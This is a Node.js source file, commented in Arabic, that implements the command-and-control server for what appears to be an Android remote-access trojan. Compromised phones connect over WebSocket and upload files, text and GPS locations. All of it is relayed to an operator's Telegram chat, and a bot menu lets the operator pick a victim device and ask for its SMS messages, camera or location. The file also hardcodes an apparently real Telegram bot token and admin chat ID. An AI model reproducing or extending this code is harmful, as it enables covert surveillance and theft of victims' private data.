// ==============================================
// استيراد جميع المكتبات المطلوبة
// ==============================================
const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');

// ==============================================
// إعدادات النظام الأساسية - عدلها حسب حاجتك
// ==============================================
const CONFIG = {
    TELEGRAM_TOKEN: '8834018446:AAFY9OmJ22qOeswwcTLsi1yTuafIWJzv41o',
    ADMIN_CHAT_ID: '5474851558',
    SERVER_PORT: process.env.PORT || 8999,
    PING_URL: 'https://www.google.com',
    PING_INTERVAL: 5000
};

// ==============================================
// تهيئة الخدمات
// ==============================================
const app = express();
const httpServer = http.createServer(app);
const wss = new WebSocket.Server({ server: httpServer });
const bot = new TelegramBot(CONFIG.TELEGRAM_TOKEN, { polling: true });
const upload = multer();
app.use(bodyParser.json());

// ==============================================
// نظام إدارة الجلسات الموحد (الجزء الأهم)
// ==============================================
const ActiveSessions = new Map();
// هيكل البيانات: sessionId = { ws: اتصال السوكت, info: {model, battery...}, lastSeen: وقت }

// ==============================================
// مسارات استقبال البيانات عبر HTTP
// ==============================================

// صفحة فحص الحالة
app.get('/', (req, res) => {
    res.send(`✅ السيرفر يعمل بكفاءة | عدد الجلسات النشطة: ${ActiveSessions.size}`);
});

// استقبال الملفات مع ربطها بالجلسة الصحيحة
app.post('/api/upload/file', upload.single('file'), (req, res) => {
    try {
        const sessionId = req.headers['x-session-id'];
        if (!sessionId || !ActiveSessions.has(sessionId)) {
            return res.status(401).json({ error: 'جلسة غير صالحة' });
        }

        const session = ActiveSessions.get(sessionId);
        bot.sendDocument(CONFIG.ADMIN_CHAT_ID, req.file.buffer, {
            caption: `📥 ملف من جهاز: <b>${session.info.model}</b>`,
            parse_mode: 'HTML'
        }, { filename: req.file.originalname });

        res.json({ status: 'ok' });
    } catch (err) {
        console.error('خطأ رفع ملف:', err);
        res.status(500).json({ error: 'خطأ في المعالجة' });
    }
});

// استقبال البيانات النصية
app.post('/api/upload/text', (req, res) => {
    try {
        const sessionId = req.headers['x-session-id'];
        if (!sessionId || !ActiveSessions.has(sessionId)) {
            return res.status(401).json({ error: 'جلسة غير صالحة' });
        }

        const session = ActiveSessions.get(sessionId);
        bot.sendMessage(CONFIG.ADMIN_CHAT_ID, 
            `📄 بيانات من جهاز <b>${session.info.model}</b>:\n\n${req.body.data}`, 
            { parse_mode: 'HTML' }
        );

        res.json({ status: 'ok' });
    } catch (err) {
        console.error('خطأ استقبال نص:', err);
        res.status(500).json({ error: 'خطأ في المعالجة' });
    }
});

// استقبال الموقع الجغرافي
app.post('/api/upload/location', (req, res) => {
    try {
        const sessionId = req.headers['x-session-id'];
        if (!sessionId || !ActiveSessions.has(sessionId)) {
            return res.status(401).json({ error: 'جلسة غير صالحة' });
        }

        const { lat, lon } = req.body;
        bot.sendLocation(CONFIG.ADMIN_CHAT_ID, lat, lon);
        bot.sendMessage(CONFIG.ADMIN_CHAT_ID, `📍 موقع جهاز: <b>${ActiveSessions.get(sessionId).info.model}</b>`, { parse_mode: 'HTML' });

        res.json({ status: 'ok' });
    } catch (err) {
        console.error('خطأ استقبال موقع:', err);
        res.status(500).json({ error: 'خطأ في المعالجة' });
    }
});

// ==============================================
// إدارة اتصالات WebSocket
// ==============================================
wss.on('connection', (ws, req) => {
    // إنشاء معرف جلسة فريد وثابت
    const sessionId = uuidv4();
    ws.sessionId = sessionId;

    // استخراج بيانات الجهاز من الترويسات
    const deviceInfo = {
        model: req.headers['x-device-model'] || 'غير معروف',
        battery: req.headers['x-battery'] || '0',
        version: req.headers['x-android-version'] || 'غير معروف',
        ip: req.socket.remoteAddress.replace(/::ffff:/, '')
    };

    // تسجيل الجلسة في النظام
    ActiveSessions.set(sessionId, {
        ws: ws,
        info: deviceInfo,
        lastSeen: Date.now()
    });

    // إشعار المدير بجهاز جديد
    bot.sendMessage(CONFIG.ADMIN_CHAT_ID, `
✅ <b>اتصال جهاز جديد</b>
• المعرف: <code>${sessionId}</code>
• الموديل: <b>${deviceInfo.model}</b>
• البطارية: <b>${deviceInfo.battery}%</b>
• الاصدار: <b>${deviceInfo.version}</b>
• العنوان: <code>${deviceInfo.ip}</code>
    `, { parse_mode: 'HTML' });

    // استقبال رسائل من الجهاز
    ws.on('message', (data) => {
        try {
            const msg = data.toString();
            bot.sendMessage(CONFIG.ADMIN_CHAT_ID, 
                `📤 رد من الجهاز <b>${deviceInfo.model}</b>:\n\n${msg}`, 
                { parse_mode: 'HTML' }
            );
            ActiveSessions.get(sessionId).lastSeen = Date.now();
        } catch (err) {
            console.error('خطأ رسالة سوكت:', err);
        }
    });

    // عند قطع الاتصال
    ws.on('close', () => {
        if (ActiveSessions.has(sessionId)) {
            bot.sendMessage(CONFIG.ADMIN_CHAT_ID, `❌ تم قطع اتصال: <b>${deviceInfo.model}</b> | المعرف: <code>${sessionId}</code>`, { parse_mode: 'HTML' });
            ActiveSessions.delete(sessionId);
        }
    });

    ws.on('error', () => ActiveSessions.delete(sessionId));
});

// ==============================================
// أوامر البوت الرئيسية
// ==============================================
bot.on('message', (msg) => {
    if (msg.chat.id != CONFIG.ADMIN_CHAT_ID || !msg.text) return;

    switch(msg.text) {
        case '/start':
            bot.sendMessage(CONFIG.ADMIN_CHAT_ID, `
🔐 <b>لوحة التحكم الرئيسية</b>
السيرفر يعمل بكامل طاقته بدون أخطاء
            `, { reply_markup: {
                keyboard: [['الأجهزة النشطة 📱'], ['إرسال أمر ⚙️']],
                resize_keyboard: true
            }, parse_mode: 'HTML' });
            break;

        case 'الأجهزة النشطة 📱':
            if (ActiveSessions.size === 0) {
                bot.sendMessage(CONFIG.ADMIN_CHAT_ID, '❌ لا يوجد أجهزة متصلة حالياً');
            } else {
                let list = '📋 <b>قائمة الأجهزة:</b>\n\n';
                ActiveSessions.forEach((s, id) => {
                    list += `• <b>${s.info.model}</b>\n  المعرف: <code>${id}</code>\n\n`;
                });
                bot.sendMessage(CONFIG.ADMIN_CHAT_ID, list, { parse_mode: 'HTML' });
            }
            break;

        case 'إرسال أمر ⚙️':
            if (ActiveSessions.size === 0) {
                bot.sendMessage(CONFIG.ADMIN_CHAT_ID, '❌ لا يوجد أجهزة متصلة');
            } else {
                const btns = [];
                ActiveSessions.forEach((s, id) => {
                    btns.push([{ text: s.info.model, callback_data: `run:${id}` }]);
                });
                bot.sendMessage(CONFIG.ADMIN_CHAT_ID, 'اختر الجهاز المستهدف:', {
                    reply_markup: { inline_keyboard: btns }
                });
            }
            break;
    }
});

// تنفيذ الأوامر
bot.on('callback_query', (q) => {
    const [action, sessionId] = q.data.split(':');
    if (action !== 'run' || !ActiveSessions.has(sessionId)) {
        return bot.answerCallbackQuery(q.id, { text: 'خطأ في الاختيار' });
    }

    const session = ActiveSessions.get(sessionId);
    bot.editMessageText(`⚙️ التحكم في: <b>${session.info.model}</b>`, {
        chat_id: CONFIG.ADMIN_CHAT_ID,
        message_id: q.message.message_id,
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: [
            [{text:'المعلومات ℹ️',callback_data:'get_info'},{text:'الرسائل 💬',callback_data:'get_sms'}],
            [{text:'الكاميرا 📷',callback_data:'cam'},{text:'الموقع 📍',callback_data:'loc'}]
        ]}
    });
    bot.answerCallbackQuery(q.id);
});

// ==============================================
// الحفاظ على نشاط السيرفر
// ==============================================
setInterval(() => {
    // إرسال إشارة نشاط للأجهزة
    ActiveSessions.forEach(s => {
        if (s.ws.readyState === WebSocket.OPEN) s.ws.send('ping');
    });
    // إبقاء السيرفر نشطاً
    axios.get(CONFIG.PING_URL).catch(() => {});
}, CONFIG.PING_INTERVAL);

// ==============================================
// تشغيل الخادم
// ==============================================
httpServer.listen(CONFIG.SERVER_PORT, () => {
    console.log(`
✅ ======================================
✅ السيرفر تم بناؤه وتشغيله بنجاح
✅ يعمل على المنفذ: ${CONFIG.SERVER_PORT}
✅ نظام الجلسات الموحد مفعل بنسبة 100%
✅ ======================================
    `);
});
